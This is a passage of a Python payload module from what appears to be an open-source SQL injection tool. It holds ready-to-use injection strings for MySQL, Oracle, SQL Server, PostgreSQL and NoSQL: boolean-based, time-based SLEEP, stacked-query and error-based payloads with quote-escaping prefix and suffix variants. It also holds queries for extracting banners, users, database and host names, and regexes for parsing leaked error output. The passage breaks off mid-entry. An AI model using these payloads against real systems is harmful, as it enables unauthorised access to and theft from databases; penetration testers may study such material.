#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""
Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT

Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

# Updated SQL Injection Payloads
NUMBER_OF_CHARACTERS_PAYLOADS = {
    "MySQL": "LENGTH(LENGTH({query}))={char}",
    "Oracle": "LENGTH(LENGTH({query}))={char}",
    "Microsoft SQL Server": "LEN(LEN({query}))={char}",
    "PostgreSQL": "LENGTH(LENGTH({query}::text)::text)={char}",
}

LENGTH_PAYLOADS = {
    "MySQL": [
        "ORD(MID(LENGTH({query}),{position},1))={char}",
        "ORD(MID(IFNULL(LENGTH({query}),0),{position},1))={char}",
        "ORD(MID(IFNULL(CAST(LENGTH({query}) AS NCHAR),0),{position},1))={char}",
    ],
    "Oracle": [
        "ASCII(SUBSTRC(LENGTH({query}),{position},1))={char}",
        "ASCII(SUBSTRC(NVL(LENGTH({query}),0),{position},1))={char}",
        "ASCII(SUBSTRC(NVL(CAST(LENGTH({query}) AS VARCHAR(4000)),0),{position},1))={char}",
    ],
    "Microsoft SQL Server": [
        "ASCII(RIGHT(LEFT(LTRIM(STR(LEN({query}))),{position}),1))={char}",
        "UNICODE(SUBSTRING(LTRIM(STR(LEN({query}))),{position},1))={char}",
        "UNICODE(SUBSTRING(LEN({query}),{position},1))={char}",
        "UNICODE(SUBSTRING(ISNULL(CAST(LEN({query}) AS NVARCHAR(4000)),0),{position},1))={char}",
    ],
    "PostgreSQL": [
        "ASCII(SUBSTRING(LENGTH({query}::text)::text FROM {position} FOR 1))={char}",
        "ASCII(SUBSTRING(COALESCE(LENGTH({query})::text,CHR(48))::text FROM {position} FOR 1))={char}",
        "ASCII(SUBSTRING(COALESCE(CAST(LENGTH({query})::text AS VARCHAR(10000))::text,CHR(32))::text FROM {position} FOR 1))={char}",
    ],
    "NoSQL": {
        "length": "[$regex]=.{1}",
        "length1": "$regex]=.{3}",
        "length2": "[$ne]=1",
    },
}

DATA_EXTRACTION_PAYLOADS = {
    "MySQL": {
        "no-cast": "ORD(MID({query},{position},1))={char}",
        "isnull": "ORD(MID(IFNULL({query},0x20),{position},1))={char}",
        "cast": "ORD(MID(IFNULL(CAST({query} AS NCHAR),0x20),{position},1))={char}",
    },
    "Oracle": {
        "no-cast": "ASCII(SUBSTRC({query},{position},1))={char}",
        "isnull": "ASCII(SUBSTRC(NVL({query},CHR(32)),{position},1))={char}",
        "cast": "ASCII(SUBSTRC(NVL(CAST({query} AS NVARCHAR(4000)),CHR(32)),{position},1))={char}",
    },
    "Microsoft SQL Server": {
        "ascii-left-right": "ASCII(RIGHT (LEFT({query},{position}))={char}",
        "no-cast": "UNICODE(SUBSTRING({query},{position},1))={char}",
        "isnull": "UNICODE(SUBSTRING(ISNULL({query},' '),{position},1))={char}",
        "cast": "UNICODE(SUBSTRING(ISNULL(CAST({query} AS NVARCHAR(4000)),' '),{position},1))={char}",
    },
    "PostgreSQL": {
        "no-cast": "ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}",
        "isnull": "ASCII(SUBSTRING((COALESCE({query}::text,CHR(32)))::text FROM {position} FOR 1))={char}",
        "cast": "ASCII(SUBSTRING((COALESCE(CAST({query}::text AS VARCHAR(10000))::text,CHR(32)))::text FROM {position} FOR 1))={char}",
    },
    "NoSQL": {
        "data": "[$ne]",
        "data1": "[$regex]=a.{2}",
        "data2": "[$regex]=b.{2}",
        "data3": "[$regex]=m.{2}",
        "data4": "[$regex]=md.{1}",
        "data5": "[$regex]=mdp",
        "data6": "[$regex]=m.*",
        "data7": "[$regex]=md.*",
    },
}

REGEX_XPATH = r"(?isx)(XPATH.*error\s*:\s*\'~(?:\()?(?P<error_based_response>.*?))\'"
REGEX_ERROR_BASED = r"(?is)(?:Duplicate\s*entry\s*(['\"])(?P<error_based_response>(.*?))(?:~)?(?:1)?\1)"
REGEX_BIGINT_BASED = r"(?isx)(BIGINT.*\s.*Injected~(?:\()?(?P<error_based_response>.*?))\~END"
REGEX_DOUBLE_BASED = r"(?isx)(DOUBLE.*\s.*Injected~(?:\()?(?P<error_based_response>.*?))\~END"
REGEX_GEOMETRIC_BASED = r"(?isx)(Illegal.*geometric.*\s.*Injected~(?:\()?(?P<error_based_response>.*?))\~END"
REGEX_GTID_BASED = r"(?isx)(?:Malformed.*?GTID.*?set.*?specification.*?\'Injected~(?:\()?(?P<error_based_response>.*?))\~END"
REGEX_JSON_KEYS = r"(?isx)(?:Injected~(?:\()?(?P<error_based_response>.*?))\~END"
REGEX_GENERIC = r"(?isx)(?:(?:r0oth3x49|START)~(?P<error_based_response>.*?)\~END)"
REGEX_GENERIC_ERRORS = r"(?is)(?:['\"]injected~(?:(?:\()?(?P<error_based_response>(.*?))(?:\()?~END['\"]))"
REGEX_MSSQL_STRING = r"(?isx)(?:'(?:~(?P<error_based_response>.*?))')"

PAYLOADS_BANNER = {
    "MySQL": [
        "VERSION()",
        "@@VERSION",
        "@@GLOBAL_VERSION",
        "@@VERSION_COMMENT",
        "VERSION/**_**/()",
        "VERSION/*!50000()*/",
    ],
    "Oracle": [
        "(SELECT banner FROM v$version WHERE ROWNUM=1)",
        "(SELECT version FROM v$instance)",
        "(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')",
    ],
    "Microsoft SQL Server": ["@@VERSION", "(SELECT @@VERSION)"],
    "PostgreSQL": ["VERSION()", "(SELECT version())"],
}

PAYLOADS_CURRENT_USER = {
    "MySQL": [
        "CURRENT_USER",
        "USER()",
        "SESSION_USER()",
        "SYSTEM_USER()",
        "USER_NAME()",
    ],
    "Oracle": ["(SELECT USER FROM DUAL)"],
    "Microsoft SQL Server": [
        "CURRENT_USER",
        "SYSTEM_USER",
        "user",
        "user_name()",
        "(SELECT SYSTEM_USER)",
        "(SELECT user)",
        "(SELECT user_name())",
        "(SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID)",
    ],
    "PostgreSQL": [
        "CURRENT_USER",
        "(SELECT usename FROM pg_user)",
        "(SELECT user)",
        "(SELECT session_user)",
        "(SELECT getpgusername())",
    ],
}

PAYLOADS_CURRENT_DATABASE = {
    "MySQL": [
        "DATABASE()",
        "SCHEMA()",
        "SCHEMA/*!50000()*/",
        "DATABASE/**_**/()",
        "DATABASE/*!50000()*/",
    ],
    "Oracle": [
        "(SELECT USER FROM DUAL)",
        "(SELECT SYS.DATABASE_NAME FROM DUAL)",
        "(SELECT global_name FROM global_name)",
        "(SELECT name FROM v$database)",
        "(SELECT instance_name FROM v$ instance)",
    ],
    "Microsoft SQL Server": ["DB_NAME()", "(SELECT DB_NAME())"],
    "PostgreSQL": ["CURRENT_SCHEMA()", "(SELECT current_database())"],
}

PAYLOADS_HOSTNAME = {
    "MySQL": [
        "@@HOSTNAME",
    ],
    "Oracle": [
        "(SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL)",
        "(SELECT host_name FROM v$instance)",
    ],
    "Microsoft SQL Server": ["@@SERVERNAME", "HOST_NAME()", "(SELECT HOST_NAME())"],
    "PostgreSQL": [
        "(SELECT CONCAT(boot_val) FROM pg_settings WHERE name='listen_addresses' GROUP BY boot_val)",
        "(SELECT inet_server_addr())",
    ],
}

PAYLOADS = {
    "BooleanTests": {
        "boolean-based": [
            {
                "payload": "AND [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": "' ", "suf": " OR '04586'='4586"},
                    {"pref": '" ', "suf": ' OR "04586"="4586'},
                    {"pref": ") ", "suf": " AND (04586=4586"},
                    {"pref": ") ", "suf": " OR (04586=4586"},
                    {"pref": "') ", "suf": " AND ('04586'='4586"},
                    {"pref": '") ', "suf": ' AND ("04586"="4586'},
                    {"pref": "' ", "suf": " AND '04586'='4586"},
                    {"pref": '" ', "suf": ' AND "04586"="4586'},
                    {"pref": "') ", "suf": " OR ('04586'='4586"},
                    {"pref": '") ', "suf": ' OR ("04586"="4586'},
                ],
                "title": "AND boolean-based blind - WHERE or HAVING clause",
                "vector": "AND [INFERENCE]",
                "dbms": "",
            },
            {
                "payload": "OR NOT [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": " AND (04586=4586"},
                    {"pref": "') ", "suf": " AND ('04586'='4586"},
                    {"pref": '") ', "suf": ' AND ("04586"="4586'},
                    {"pref": "' ", "suf": " AND '04586'='4586"},
                    {"pref": '" ', "suf": ' AND "04586"="4586'},
                ],
                "title": "OR boolean-based blind - WHERE or HAVING clause (NOT)",
                "vector": "OR NOT [INFERENCE]",
                "dbms": "",
            },
            {
                "payload": "OR [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": " AND (04586=4586"},
                    {"pref": "') ", "suf": " AND ('04586'='4586"},
                    {"pref": '") ', "suf": ' AND ("04586"="4586'},
                    {"pref": "' ", "suf": " AND '04586'='4586"},
                    {"pref": '" ', "suf": ' AND "04586"="4586'},
                    {"pref": "') ", "suf": " OR ('04586'='4586"},
                    {"pref": '") ', "suf": ' OR ("04586"="4586'},
                    {"pref": "' ", "suf": " OR '04586'='4586--"},
                    {"pref": '" ', "suf": ' OR "04586"="4586--'},
                ],
                "title": "OR boolean-based blind - WHERE or HAVING clause",
                "vector": "OR [INFERENCE]",
                "dbms": "",
            },
            {
                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": " ", "suf": "--"},
                    {"pref": "' AND 0546=", "suf": "--"},
                    {"pref": '" AND 0456=', "suf": "--"},
                    {"pref": ") AND 0866=", "suf": "--"},
                    {"pref": "') AND 0758=", "suf": "--"},
                    {"pref": '") AND 0541=', "suf": "--"},
                ],
                "title": "Boolean-based blind - Parameter replace",
                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
                "dbms": "",
            },
            {
                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
                "comments": [
                    {"pref": "", "suf": ""},
                ],
                "title": "Boolean-based blind - Parameter replace (original value)",
                "vector": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
                "dbms": "",
            },
            {
                "payload": "(SELECT CASE WHEN([RANDNUM]=[RANDNUM]) THEN 9854 ELSE 0 END)",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": "", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": '"AND', "suf": 'AND"Z'},
                    {"pref": "'AND", "suf": "AND'Z"},
                    {"pref": "'XOR", "suf": "XOR'Z"},
                    {"pref": '"XOR', "suf": 'XOR"Z'},
                    {"pref": "'OR", "suf": "OR'Z"},
                    {"pref": '"OR', "suf": 'OR"Z'},
                    {"pref": " AND 9854=", "suf": "-- wXyW"},
                    {"pref": " OR 9854=", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                ],
                "title": "boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)",
                "vector": "(SELECT CASE WHEN([INFERENCE]) THEN 9854 ELSE 0 END)",
                "dbms": "",
            },
        ]
    },
    "MySQL": {
        "inline-query": [],
        "stacked-queries": [
            {
                "payload": "(SELECT(1)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
                "comments": [
                    {"pref": ";", "suf": "--"},
                    {"pref": ",", "suf": "--"},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                    {"pref": "',", "suf": "--"},
                    {"pref": '"', "suf": "--"},
                ],
                "title": "MySQL >= 5.0.12 stacked queries (query SLEEP)",
                "vector": "(SELECT(1)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                "dbms": "MySQL",
            },
            {
                "payload": "IF(NOW()=SYSDATE(),SLEEP([SLEEPTIME]),0)",
                "comments": [
                    {"pref": ";", "suf": "--"},
                    {"pref": ",", "suf": "--"},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                    {"pref": "',", "suf": "--"},
                    {"pref": '",', "suf": "--"},
                ],
                "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - comment)",
                "vector": "IF([INFERENCE],SLEEP([SLEEPTIME]),0)",
                "dbms": "MySQL",
            },
            {
                "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
                "comments": [
                    {"pref": ";", "suf": "--"},
                    {"pref": ",", "suf": "--"},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                    {"pref": "',", "suf": "--"},
                    {"pref": '",', "suf": "--"},
                ],
                "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)",
                "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
                "dbms": "MySQL",
            },
        ],
        "boolean-based": [
            {
                "payload": "AND [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": "#"},
                    {"pref": "' ", "suf": "#"},
                    {"pref": '" ', "suf": "#"},
                    {"pref": ") ", "suf": "#"},
                    {"pref": "') ", "suf": "#"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "AND boolean-based blind - WHERE or HAVING clause (MySQL comment)",
                "vector": "AND [INFERENCE]",
                "dbms": "MySQL",
            },
            {
                "payload": "OR [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": "#"},
                    {"pref": "' ", "suf": "#"},
                    {"pref": '" ', "suf": "#"},
                    {"pref": ") ", "suf": "#"},
                    {"pref": "') ", "suf": "#"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "OR boolean-based blind - WHERE or HAVING clause (MySQL comment)",
                "vector": "OR [INFERENCE]",
                "dbms": "MySQL",
            },
            {
                "payload": "OR NOT [RANDNUM]=[RANDNUM]",
                "comments": [
                    {"pref": " ", "suf": "#"},
                    {"pref": "' ", "suf": "#"},
                    {"pref": '" ', "suf": "#"},
                    {"pref": ") ", "suf": "#"},
                    {"pref": "') ", "suf": "#"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)",
                "vector": "OR NOT [INFERENCE]",
                "dbms": "MySQL",
            },
            {
                "payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))",
                "comments": [
                    {"pref": "", "suf": ""},
                ],
                "title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
                "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
                "payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))",
                "comments": [
                    {"pref": "", "suf": ""},
                ],
                "title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
                "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
                "dbms": "MySQL",
            },
            {
                "payload": "(IF([RANDNUM]=[RANDNUM],1,(SELECT table_name FROM information_schema.tables)))",
                "comments": [
                    {"pref": "'AND", "suf": "AND'Z"},
                    {"pref": '"AND', "suf": 'AND"Z'},
                    {"pref": "'XOR", "suf": "XOR'Z"},
                    {"pref": '"XOR', "suf": 'XOR"Z'},
                    {"pref": "'OR", "suf": "OR'Z"},
                    {"pref": '"OR', "suf": 'OR"Z'},
                ],
                "title": "MySQL boolean-based blind - (IF STATEMENT)",
                "vector": "(IF([INFERENCE],1,(SELECT table_name FROM information_schema.tables)))",
                "dbms": "MySQL",
            },
        ],
        "time-based": [
            {
                "payload": "(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
                "comments": [
                    {"pref": "'XOR", "suf": "XOR'Z"},
                    {"pref": '"XOR', "suf": 'XOR"Z'},
                    {"pref": "", "suf": ""},
                    {"pref": "'+", "suf": "+'"},
                    {"pref": '"+', "suf": '+"'},
                    {"pref": "'OR", "suf": "OR'Z"},
                    {"pref": '"OR', "suf": 'OR"Z'},
                    {"pref": "'AND", "suf": "AND'Z"},
                    {"pref": '"AND', "suf": 'AND"Z'},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
                "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                "dbms": "MySQL",
            },
            {
                "payload": "IF(NOW()=SYSDATE(),SLEEP([SLEEPTIME]),0)",
                "comments": [
                    {"pref": "'XOR(", "suf": ")XOR'Z"},
                    {"pref": '"XOR(', "suf": ')XOR"Z'},
                    {"pref": "", "suf": ""},
                    {"pref": "'AND(", "suf": ")AND'Z"},
                    {"pref": "'OR(", "suf": ")OR'Z"},
                    {"pref": '"OR(', "suf": ')OR"Z'},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (IF - comment)",
                "vector": "IF([INFERENCE],SLEEP([SLEEPTIME]),0)",
                "dbms": "MySQL",
            },
            {
                "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
                "comments": [
                    {"pref": "'XOR", "suf": "XOR'Z"},
                    {"pref": '"XOR', "suf": 'XOR"Z'},
                    {"pref": "", "suf": ""},
                    {"pref": "'OR", "suf": "OR'Z"},
                    {"pref": "'AND", "suf": "AND'Z"},
                    {"pref": "'+", "suf": "+'"},
                    {"pref": "", "suf": "-- wXyW"},
                    {"pref": '"AND', "suf": 'AND"Z'},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (CASE STATEMENT)",
                "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
                "dbms": "MySQL",
            },
            {
                "payload": "SLEEP([SLEEPTIME])",
                "comments": [
                    {"pref": " AND ", "suf": ""},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.0.12 time-based blind (SLEEP)",
                "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
                "dbms": "MySQL",
            },
            {
                "payload": "a' OR (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- -",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Delays execution using SLEEP",
                "vector": "a' OR (SELECT 1 FROM (SELECT(SLEEP([SLEEPTIME])))a)-- -",
                "dbms": "MySQL",
            },
            {
                "payload": "1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Uses SLEEP to delay response",
                "vector": "1'+AND+(SELECT+1+FROM+(SELECT(SLEEP([SLEEPTIME])))a)--+-",
                "dbms": "MySQL",
            },
            {
                "payload": "1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(3)))a)--+-",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Uses SLEEP to delay response",
                "vector": "1)+AND+(SELECT+1+FROM+(SELECT(SLEEP([SLEEPTIME])))a)--+-",
                "dbms": "MySQL",
            },
            {
                "payload": "id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Uses SLEEP to delay response",
                "vector": "id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)",
                "dbms": "MySQL",
            },
            {
                "payload": "1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Uses SLEEP to delay response",
                "vector": "1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--",
                "dbms": "MySQL",
            },
            {
                "payload": "1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Uses SLEEP to delay response",
                "vector": "1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}",
                "dbms": "MySQL",
            },
            {
                "payload": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Uses SLEEP to delay response",
                "vector": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
                "dbms": "MySQL",
            },
            {
                "payload": "LTEgT1IgU0xFRVAoMik=",  # Base64 for '-1 OR SLEEP(2)'
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Base64 encoded SLEEP",
                "vector": "LTEgT1IgU0xFRVAoMik=",
                "dbms": "MySQL",
            },
            {
                "payload": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "MySQL time-based blind - Uses SLEEP to delay response",
                "vector": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
                "dbms": "MySQL",
            }
        ],
        "error-based": [
            {
                "payload": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",
                "vector": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)",
                "vector": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)",
                "vector": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
                "dbms": "MySQL",
            },
            {
                "payload": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
